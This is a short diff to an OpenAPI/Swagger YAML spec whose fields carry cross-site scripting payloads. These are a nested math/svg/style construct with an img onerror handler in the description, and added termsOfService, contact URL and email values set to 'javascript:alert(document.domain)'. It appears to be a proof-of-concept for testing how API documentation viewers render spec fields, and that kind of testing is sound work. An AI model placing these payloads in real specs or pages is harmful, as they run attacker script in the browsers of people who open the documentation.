@@ -4,6 +4,11 @@ info:
   description: |
     <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title=\"</style><img src onerror='alert(1)'>\"></style></h1>
   version: production
+  termsOfService: "javascript:alert(document.domain)"
+  contact: 
+    name: "Kharaone",
+    url: "javascript:alert(document.domain)",
+    email: "javascript:alert(document.domain)"
 basePath: /JSSResource/
 produces:
   - application/xml
